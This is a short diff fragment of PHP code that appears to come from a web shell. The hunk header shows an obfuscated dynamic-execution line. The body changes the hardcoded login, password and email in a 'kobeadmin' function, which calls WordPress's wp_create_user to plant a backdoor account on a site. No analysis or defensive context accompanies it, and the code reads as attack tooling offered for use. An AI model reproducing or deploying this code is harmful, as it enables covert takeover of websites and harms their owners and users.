@@ -766,9 +766,9 @@ $T=$u('',$r);$T();
     } elseif ($_POST['option'] == '5') {?>
 <div class="container-fluid language-javascript mt-3">
         <div class="shell mb-3 position-relative"><pre style="font-size:10px;" id="code"><code>function kobeadmin(){
-$login = 'kobe';
-$passw = 'kobeganteng13+13';
-$email = 'kobe-ganteng@proton.me';
+$login = 'kob3';
+$passw = '+13';
+$email = '1337@1337';
 if ( !username_exists( $login ) && !email_exists( $email ) ) {
 $user_id = wp_create_user( $login, $passw, $email );
 $user = new WP_User( $user_id );
